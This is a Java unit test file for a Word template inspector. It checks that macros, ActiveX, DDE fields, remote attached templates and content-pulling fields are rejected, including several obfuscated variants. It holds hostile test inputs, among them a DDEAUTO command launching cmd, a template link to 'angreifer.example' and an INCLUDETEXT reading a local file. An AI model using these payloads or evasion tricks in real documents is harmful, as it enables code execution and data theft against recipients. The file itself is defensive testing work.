package io.opaa.template;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import io.opaa.common.PayloadTooLargeException;
import io.opaa.common.ValidationException;
import io.opaa.format.shared.ParserLimitProperties;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class DocxTemplateInspectorTest {

  private final DocxTemplateInspector inspector =
      new DocxTemplateInspector(ParserLimitProperties.DEFAULTS);

  @TempDir Path directory;

  @Test
  void readsThePlaceholdersOfAWordDocument() throws IOException {
    Path file =
        write(TestDocx.withParagraphs("Betreff: {{ betreff }}", "{% if anlage %}x{% endif %}"));

    assertThat(inspector.inspect(file, "vermerk.docx", Files.size(file)))
        .containsExactly(
            new TemplatePlaceholder("betreff", PlaceholderKind.FIELD, List.of()),
            new TemplatePlaceholder("anlage", PlaceholderKind.CONDITION, List.of()));
  }

  @Test
  void aFileThatIsNoWordDocumentIsRefused() throws IOException {
    Path file = write("kein Word".getBytes(StandardCharsets.UTF_8));

    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
        .isInstanceOf(ValidationException.class)
        .hasMessageContaining("kein gültiges Word-Dokument");
  }

  @Test
  void anotherExtensionIsRefused() throws IOException {
    Path file = write(TestDocx.withParagraphs("{{ a }}"));

    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docm", Files.size(file)))
        .isInstanceOf(ValidationException.class);
  }

  @Test
  void aDocumentWithMacrosIsRefused() throws IOException {
    Path file =
        write(withEntry(TestDocx.withParagraphs("{{ a }}"), "word/vbaProject.bin", new byte[16]));

    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
        .isInstanceOf(ValidationException.class)
        .hasMessageContaining("Makros");
  }

  @Test
  void aDocumentWithActiveXControlsIsRefused() throws IOException {
    Path file =
        write(
            withEntry(
                TestDocx.withParagraphs("{{ a }}"),
                "word/activeX/activeX1.xml",
                "<ax:ocx xmlns:ax=\"http://schemas.microsoft.com/office/2006/activeX\"/>"
                    .getBytes(StandardCharsets.UTF_8)));

    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
        .isInstanceOf(ValidationException.class)
        .hasMessageContaining("ActiveX");
  }

  @Test
  void anAttachedTemplateFromOutsideIsRefused() throws IOException {
    Path file =
        write(
            withPackage(
                document ->
                    document
                        .getPackagePart()
                        .addExternalRelationship(
                            "http://angreifer.example/makros.dotm",
                            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
                                + "attachedTemplate")));

    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
        .isInstanceOf(ValidationException.class)
        .hasMessageContaining("nachladen");
  }

  @Test
  void aHyperlinkStaysAllowed() throws IOException {
    Path file =
        write(
            withPackage(
                document ->
                    document
                        .getPackagePart()
                        .addExternalRelationship(
                            "https://www.example.org",
                            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
                                + "hyperlink")));

    assertThat(inspector.inspect(file, "vorlage.docx", Files.size(file))).isNotEmpty();
  }

  @Test
  void aDdeFieldIsRefused() throws IOException {
    Path file =
        write(
            withPackage(
                document ->
                    document
                        .createParagraph()
                        .createRun()
                        .getCTR()
                        .addNewInstrText()
                        .setStringValue(" DDEAUTO cmd \"/c calc\" ")));

    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
        .isInstanceOf(ValidationException.class)
        .hasMessageContaining("nachladen");
  }

  @Test
  void aFieldHiddenByACharacterReferenceAPrefixOrSplitRunsIsRefused() throws IOException {
    List<String> hidden =
        List.of(
            "<w:p><w:fldSimple w:instr=\"&#73;NCLUDEPICTURE \\\\host\\x \\d\"/></w:p>",
            "<w:p><w:r><w:instrText>INCL</w:instrText></w:r>"
                + "<w:r><w:instrText>UDEPICTURE x</w:instrText></w:r></w:p>",
            "<w:p><w:r><q:instrText xmlns:q=\"http://schemas.openxmlformats.org/wordprocessingml/"
                + "2006/main\">INCLUDETEXT x</q:instrText></w:r></w:p>");
    for (String field : hidden) {
      byte[] docx = withBodyStart(TestDocx.withParagraphs("{{ a }}"), field);
      Path file = write(docx);

      assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
          .as(field)
          .isInstanceOf(ValidationException.class)
          .hasMessageContaining("nachladen");
      assertThat(new DocxActiveContent(ParserLimitProperties.DEFAULTS).isPassive(docx))
          .as(field)
          .isFalse();
    }
  }

  @Test
  void aFieldInsideTheCodeOfAnotherFieldOrAFieldOffTheListIsRefused() throws IOException {
    String begin = "<w:r><w:fldChar w:fldCharType=\"begin\"/></w:r>";
    String separate = "<w:r><w:fldChar w:fldCharType=\"separate\"/></w:r>";
    String end = "<w:r><w:fldChar w:fldCharType=\"end\"/></w:r>";
    String quote = "QUOTE 73 78 67 76 85 68 69 80 73 67 84 85 82 69";
    List<String> active =
        List.of(
            "<w:p>" + begin + begin + instr(quote) + end + instr(" x \\d") + end + "</w:p>",
            "<w:p>" + begin + instr(quote) + end + "</w:p>",
            "<w:p>" + begin + instr("REF ") + begin + instr("PAGE") + end + end + "</w:p>",
            "<w:p>" + begin + instr("REF ") + "<w:fldSimple w:instr=\"PAGE\"/>" + end + "</w:p>",
            "<w:p>" + begin + instr("IF 1 = 1 x") + separate + end + "</w:p>",
            "<w:p><w:fldSimple w:instr=\" MACROBUTTON x \"/></w:p>");
    for (String field : active) {
      byte[] docx = withBodyStart(TestDocx.withParagraphs("{{ a }}"), field);
      Path file = write(docx);

      assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
          .as(field)
          .isInstanceOf(ValidationException.class)
          .hasMessageContaining("nachladen");
      assertThat(new DocxActiveContent(ParserLimitProperties.DEFAULTS).isPassive(docx))
          .as(field)
          .isFalse();
    }
    String toc =
        "<w:p>"
            + begin
            + instr(" TOC \\o \"1-3\" \\h ")
            + separate
            + begin
            + instr(" PAGEREF _Toc1 \\h ")
            + separate
            + "<w:r><w:t>3</w:t></w:r>"
            + end
            + end
            + "</w:p><w:p><w:fldSimple w:instr=\" NUMPAGES \\* MERGEFORMAT \"/></w:p>";
    assertThat(
            new DocxActiveContent(ParserLimitProperties.DEFAULTS)
                .isPassive(withBodyStart(TestDocx.withParagraphs("Text"), toc)))
        .isTrue();
  }

  @Test
  void aMailMergeDataSourceOrAFormFieldMacroIsRefused() throws IOException {
    byte[] mailMerge =
        withPart(
            TestDocx.withParagraphs("{{ a }}"),
            "word/settings.xml",
            "<w:settings",
            "<w:mailMerge><w:mainDocumentType w:val=\"formLetters\"/>"
                + "<w:connectString w:val=\"Provider=x\"/><w:query w:val=\"SELECT * FROM x\"/>"
                + "</w:mailMerge>");
    byte[] macro =
        withBodyStart(
            TestDocx.withParagraphs("{{ a }}"),
            "<w:p><w:r><w:fldChar w:fldCharType=\"begin\"><w:ffData><w:name w:val=\"T\"/>"
                + "<w:exitMacro w:val=\"AutoOpen\"/></w:ffData></w:fldChar></w:r>"
                + instr(" FORMTEXT ")
                + "<w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>");
    for (byte[] docx : List.of(mailMerge, macro)) {
      Path file = write(docx);

      assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
          .isInstanceOf(ValidationException.class);
      assertThat(new DocxActiveContent(ParserLimitProperties.DEFAULTS).isPassive(docx)).isFalse();
    }
  }

  /** {@code docx} with {@code xml} inserted right after the opening tag starting {@code tag}. */
  private static byte[] withPart(byte[] docx, String name, String tag, String xml)
      throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    try (ZipInputStream in = new ZipInputStream(new ByteArrayInputStream(docx));
        ZipOutputStream zip = new ZipOutputStream(out)) {
      for (ZipEntry entry = in.getNextEntry(); entry != null; entry = in.getNextEntry()) {
        zip.putNextEntry(new ZipEntry(entry.getName()));
        byte[] content = in.readAllBytes();
        if (entry.getName().equals(name)) {
          String text = new String(content, StandardCharsets.UTF_8);
          int open = text.indexOf('>', text.indexOf(tag)) + 1;
          content =
              (text.substring(0, open) + xml + text.substring(open))
                  .getBytes(StandardCharsets.UTF_8);
        }
        zip.write(content);
        zip.closeEntry();
      }
    }
    return out.toByteArray();
  }

  private static String instr(String code) {
    return "<w:r><w:instrText xml:space=\"preserve\">" + code + "</w:instrText></w:r>";
  }

  @Test
  void aPlainDocumentIsPassiveAndAnUnreadableOneIsNot() throws IOException {
    DocxActiveContent check = new DocxActiveContent(ParserLimitProperties.DEFAULTS);
    byte[] plain =
        withBodyStart(
            TestDocx.withParagraphs("Text"),
            "<w:p><w:r><w:instrText>PAGE</w:instrText></w:r>"
                + "<w:r><w:instrText> MERGEFIELD AddEntry</w:instrText></w:r></w:p>");

    assertThat(check.isPassive(plain)).isTrue();
    assertThat(check.isPassive("kein Word".getBytes(StandardCharsets.UTF_8))).isFalse();
  }

  @Test
  void onlyAWordDocumentOrTemplateIsAdmittedAsMainPart() throws IOException {
    DocxActiveContent check = new DocxActiveContent(ParserLimitProperties.DEFAULTS);
    byte[] plain = TestDocx.withParagraphs("Text");
    String document =
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml";

    assertThat(
            check.isPassive(
                withContentType(
                    plain,
                    document,
                    "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml")))
        .isTrue();
    assertThat(
            check.isPassive(
                withContentType(
                    plain,
                    document,
                    "application/vnd.ms-word.template.macroEnabledTemplate.main+xml")))
        .isFalse();
    assertThat(
            check.isPassive(
                withContentType(
                    plain, document, "application/vnd.ms-word.document.macroEnabled.main+xml")))
        .isFalse();
  }

  /** {@code docx} with the content type {@code from} declared as {@code to}. */
  private static byte[] withContentType(byte[] docx, String from, String to) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    try (ZipInputStream in = new ZipInputStream(new ByteArrayInputStream(docx));
        ZipOutputStream zip = new ZipOutputStream(out)) {
      for (ZipEntry entry = in.getNextEntry(); entry != null; entry = in.getNextEntry()) {
        zip.putNextEntry(new ZipEntry(entry.getName()));
        byte[] content = in.readAllBytes();
        if (entry.getName().equals("[Content_Types].xml")) {
          String text = new String(content, StandardCharsets.UTF_8);
          assertThat(text).contains(from);
          content = text.replace(from, to).getBytes(StandardCharsets.UTF_8);
        }
        zip.write(content);
        zip.closeEntry();
      }
    }
    return out.toByteArray();
  }

  /** {@code docx} with {@code xml} inserted at the start of the document body. */
  private static byte[] withBodyStart(byte[] docx, String xml) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    try (ZipInputStream in = new ZipInputStream(new ByteArrayInputStream(docx));
        ZipOutputStream zip = new ZipOutputStream(out)) {
      for (ZipEntry entry = in.getNextEntry(); entry != null; entry = in.getNextEntry()) {
        zip.putNextEntry(new ZipEntry(entry.getName()));
        byte[] content = in.readAllBytes();
        if (entry.getName().equals("word/document.xml")) {
          String text = new String(content, StandardCharsets.UTF_8);
          int body = text.indexOf("<w:body>") + "<w:body>".length();
          content =
              (text.substring(0, body) + xml + text.substring(body))
                  .getBytes(StandardCharsets.UTF_8);
        }
        zip.write(content);
        zip.closeEntry();
      }
    }
    return out.toByteArray();
  }

  private static byte[] withPackage(
      java.util.function.Consumer<org.apache.poi.xwpf.usermodel.XWPFDocument> change)
      throws IOException {
    try (org.apache.poi.xwpf.usermodel.XWPFDocument document =
            new org.apache.poi.xwpf.usermodel.XWPFDocument(
                new ByteArrayInputStream(TestDocx.withParagraphs("{{ a }}")));
        ByteArrayOutputStream out = new ByteArrayOutputStream()) {
      change.accept(document);
      document.write(out);
      return out.toByteArray();
    }
  }

  @Test
  void aFileAboveTenMegabytesIsRefused() throws IOException {
    Path file = write(TestDocx.withParagraphs("{{ a }}"));

    assertThatThrownBy(
            () -> inspector.inspect(file, "vorlage.docx", DocxTemplateInspector.MAX_BYTES + 1))
        .isInstanceOf(PayloadTooLargeException.class);
  }

  private Path write(byte[] content) throws IOException {
    Path file = Files.createTempFile(directory, "template", ".docx");
    Files.write(file, content);
    return file;
  }

  /** {@code docx} with one more archive entry, the way a macro-enabled save adds its project. */
  private static byte[] withEntry(byte[] docx, String name, byte[] content) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    try (ZipInputStream in = new ZipInputStream(new ByteArrayInputStream(docx));
        ZipOutputStream zip = new ZipOutputStream(out)) {
      for (ZipEntry entry = in.getNextEntry(); entry != null; entry = in.getNextEntry()) {
        zip.putNextEntry(new ZipEntry(entry.getName()));
        in.transferTo(zip);
        zip.closeEntry();
      }
      zip.putNextEntry(new ZipEntry(name));
      zip.write(content);
      zip.closeEntry();
    }
    return out.toByteArray();
  }

  /**
   * A field code counts as Word reads it: joined across the runs of a complex field, under any
   * namespace prefix, and in a simple field with either quote.
   */
  @Test
  void aFieldThatPullsInContentIsRefusedHoweverItIsWritten() throws IOException {
    String w = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
    List<String> hidden =
        List.of(
            "<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r>"
                + "<w:r><w:instrText xml:space=\"preserve\"> INCLUDE</w:instrText></w:r>"
                + "<w:r><w:instrText>PICTURE \"https://x.example/p.png\" \\d</w:instrText></w:r>"
                + "<w:r><w:fldChar w:fldCharType=\"separate\"/></w:r><w:r><w:t>x</w:t></w:r>"
                + "<w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>",
            "<x:p xmlns:x=\""
                + w
                + "\"><x:r><x:instrText> DDEAUTO cmd \"/c calc\"</x:instrText></x:r></x:p>",
            "<w:p><w:fldSimple w:instr=' INCLUDETEXT \"c:/geheim.docx\" '><w:r><w:t>x</w:t></w:r>"
                + "</w:fldSimple></w:p>");
    for (String field : hidden) {
      byte[] docx = withBodyStart(TestDocx.withParagraphs("{{ a }}"), field);
      Path file = write(docx);

      assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
          .as(field)
          .isInstanceOf(ValidationException.class)
          .hasMessageContaining("nachladen");
      assertThat(new DocxActiveContent(ParserLimitProperties.DEFAULTS).isPassive(docx))
          .as(field)
          .isFalse();
    }
  }

  @Test
  void aMergeFieldSplitAcrossRunsStaysAllowed() throws IOException {
    Path file =
        write(
            withBodyStart(
                TestDocx.withParagraphs("{{ a }}"),
                "<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r>"
                    + instr(" MERGE")
                    + instr("FIELD Name")
                    + "<w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>"));

    assertThat(inspector.inspect(file, "vorlage.docx", Files.size(file))).isNotEmpty();
  }
}
